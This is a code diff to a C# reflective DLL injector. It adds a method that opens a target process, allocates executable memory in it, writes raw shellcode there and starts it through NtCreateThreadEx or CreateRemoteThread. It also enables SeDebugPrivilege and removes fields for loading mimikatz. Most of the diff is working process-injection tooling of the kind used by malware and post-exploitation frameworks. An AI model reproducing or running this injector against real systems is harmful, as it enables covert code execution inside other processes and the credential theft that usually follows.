@@ -17,10 +17,10 @@ namespace ReflectiveInjector
         public int processId;
         private byte[] pe;
 
-        public Injector(int pid, byte[] dll)
+        public Injector(int pid, byte[] raw)
         {
             processId = pid;
-            pe = dll;
+            pe = raw;
         }
 
         public Injector(int pid, string dllpath)
@@ -29,14 +29,79 @@ namespace ReflectiveInjector
             pe = File.ReadAllBytes(dllpath);
         }
 
-        public Injector(byte[] dll)
+        public Injector(byte[] raw)
         {
-            pe = dll;
+            pe = raw;
         }
 
         public Injector(string dllpath)
         {
             pe = File.ReadAllBytes(dllpath);
+        }
+
+        public unsafe bool InjectSC()
+        {
+            bool success = false;
+            fixed (byte* buffer = pe)
+            {
+                
+#if DEBUG
+                Console.WriteLine("In InjectSC function");
+#endif
+                uint Access = (VM_CREATE_THREAD | VM_QUERY | VM_OPERATION | VM_WRITE | VM_READ);
+                //uint allAccess = (0x000F0000 | 0x00100000 | 0xFFF);
+                hProcess = OpenProcess(Access, false, processId);
+                if (hProcess == IntPtr.Zero)
+                    return success;
+
+#if DEBUG
+                Console.WriteLine("Obtained handle to " + processId + " with value: " + hProcess.ToString("X8"));
+#endif
+
+                if (!IsWow64Process(hProcess, out IsWow64))
+                    return false;
+
+                uint alloc_type = (MEM_COMMIT | MEM_RESERVE);
+
+                baseAddress = VirtualAllocEx(hProcess, IntPtr.Zero, (IntPtr)pe.Length, alloc_type, 0x40 /*PAGE_EXECUTE_READ_WRITE*/);
+                if (baseAddress == IntPtr.Zero)
+                    return false;
+
+#if DEBUG
+                Console.WriteLine("Allocated memory in remote process at: " + baseAddress.ToString("X8"));
+#endif
+                int bw = 0;
+                if (!WriteProcessMemory(hProcess, baseAddress, (IntPtr)buffer, (uint)pe.Length, ref bw) || bw == 0)
+                    return false;
+
+                //OS Version determines whether to use CreateRemoteThread or NtCreateThreadEx
+                var Osv = Environment.OSVersion.Version;
+                if (Osv >= new Version(6, 0) && Osv < new Version(6, 2))
+                {
+                    uint retVal = NtCreateThreadEx(ref hThread, 0x1FFFFF, IntPtr.Zero, hProcess, baseAddress, IntPtr.Zero, false, 0, 0, 0, IntPtr.Zero);
+                    if (hThread == IntPtr.Zero)
+                        return false;
+#if DEBUG
+                    Console.WriteLine("Called NtCreateThreadEx. Return value: " + retVal);
+                    Console.WriteLine("Thread handle value: " + hThread.ToString("X8"));
+#endif
+                    CloseHandle(hProcess);
+                    CloseHandle(hThread);
+                    return true;
+                }
+                else
+                {
+                    hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0xFFFF, baseAddress, IntPtr.Zero, 0, IntPtr.Zero);
+                    if (hThread == IntPtr.Zero)
+                        return false;
+#if DEBUG
+                    Console.WriteLine("Called CreateRemoteThread. Thread handle value: " + hThread.ToString("X8"));
+#endif
+                    CloseHandle(hProcess);
+                    CloseHandle(hThread);
+                    return true;
+                }
+            }
         }
 
         public bool Load(string FunctionName = "ReflectiveLoader")
@@ -56,8 +121,8 @@ namespace ReflectiveInjector
         {
             bool success = false;
             Export = FunctionName;
-            //Enable SeDebugPrivilege in one function call. Gotta love .NET :)
-            //Process.EnterDebugMode();
+            
+            Process.EnterDebugMode();
 #if DEBUG
             Console.WriteLine("In Inject function");
 #endif
@@ -84,7 +149,6 @@ namespace ReflectiveInjector
 
             //Find the offset of the ReflectiveLoaderFunction locally
             ReflectiveLoaderOffset = FindExportOffset();
-
             if (ReflectiveLoaderOffset != 0)
             {
                 Marshal.Copy(pe, 0, baseAddress, pe.Length);
@@ -102,20 +166,19 @@ namespace ReflectiveInjector
 #if DEBUG
                 Console.WriteLine("Called CreateThread locally, thread handle: " + hThread.ToString("X8"));
 #endif
-
                 CloseHandle(hThread);
                 return true;
             }
 
             return false;
         }
+
         private unsafe bool LoadRemoteLibrary()
         {
             fixed (byte* buffer = pe)
             {
                 //Find the offset of the ReflectiveLoaderFunction
                 ReflectiveLoaderOffset = FindExportOffset();
-                
                 if (ReflectiveLoaderOffset != 0)
                 {
                     uint alloc_type = (MEM_COMMIT | MEM_RESERVE);
@@ -140,8 +203,8 @@ namespace ReflectiveInjector
                     var Osv = Environment.OSVersion.Version;
                     if (Osv >= new Version(6, 0) && Osv < new Version(6, 2))
                     {
-                        uint retVal = NtCreateThreadEx(ref hThread, 0x1FFFFF, IntPtr.Zero, hProcess, RemoteReflectiveLoader, IntPtr.Zero, false, 0, 0xFFFF, 0xFFFF, IntPtr.Zero);
-                        if (hThread == IntPtr.Zero || retVal != 0)
+                        uint retVal = NtCreateThreadEx(ref hThread, 0x1FFFFF, IntPtr.Zero, hProcess, RemoteReflectiveLoader, IntPtr.Zero, false, 0, 0, 0, IntPtr.Zero);
+                        if (hThread == IntPtr.Zero)
                             return false;
 #if DEBUG
                         Console.WriteLine("Called NtCreateThreadEx. Return value: " + retVal);
@@ -324,9 +387,6 @@ namespace ReflectiveInjector
         unsafe byte* optional_hdr = null;
         ushort numberOfSections;
         string Export = "";
-        uint mimikatzOffset = 0;
-        public bool mimikatz = false;
-        public IntPtr mimikatzPtr;
 
         uint ReflectiveLoaderOffset;
         bool IsWow64;
